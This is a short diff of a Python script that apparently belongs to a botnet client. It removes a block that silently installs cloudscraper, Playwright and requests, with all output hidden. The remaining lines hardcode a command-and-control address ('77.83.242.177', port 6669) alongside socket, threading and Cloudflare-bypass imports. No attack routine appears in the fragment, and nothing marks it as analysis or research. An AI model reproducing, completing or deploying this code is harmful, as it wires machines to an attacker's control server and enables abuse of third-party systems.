@@ -1,39 +1,5 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-import sys
-import subprocess
-import importlib
-import os
-DEVNULL = subprocess.DEVNULL
-
-def pip_install(package):
-    subprocess.check_call(
-        [sys.executable, "-m", "pip", "install", package],
-        stdout=DEVNULL,
-        stderr=DEVNULL
-    )
-
-def ensure_package(import_name, pip_name=None):
-    try:
-        importlib.import_module(import_name)
-    except ImportError:
-        pip_install(pip_name or import_name)
-
-# Dépendances
-packages = [
-    ("cloudscraper", None),
-    ("playwright", None),
-    ("requests", None),
-]
-for import_name, pip_name in packages:
-    ensure_package(import_name, pip_name)
-
-subprocess.run(
-    [sys.executable, "-m", "playwright", "install", "firefox"],
-    stdout=DEVNULL,
-    stderr=DEVNULL,
-    check=True
-)
 
 import socket
 import threading
@@ -43,7 +9,6 @@ import cloudscraper
 import string
 import ssl
 import requests
-from playwright.sync_api import sync_playwright
 
 C2_ADDRESS = "77.83.242.177"
 C2_PORT = 6669
